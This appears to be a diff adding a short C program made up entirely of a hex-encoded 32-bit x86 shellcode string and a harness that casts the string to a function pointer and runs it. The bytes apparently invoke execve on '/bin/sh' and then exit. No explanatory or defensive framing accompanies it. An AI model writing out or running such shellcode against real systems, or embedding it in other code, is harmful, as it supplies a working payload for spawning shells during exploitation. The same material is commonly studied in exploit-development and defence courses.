@@ -1,0 +1,11 @@
+char* code = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3"
+             "\xb0\x0b\xcd\x80\xbb\x0a\x00\x00\x00\xb8\x01\x00"
+             "\x00\x00\xcd\x80";
+
+int main(int argc, char **argv)
+{
+    int (*func)();
+    func = (int (*) ())code;
+    (int)(*func)();
+}
+
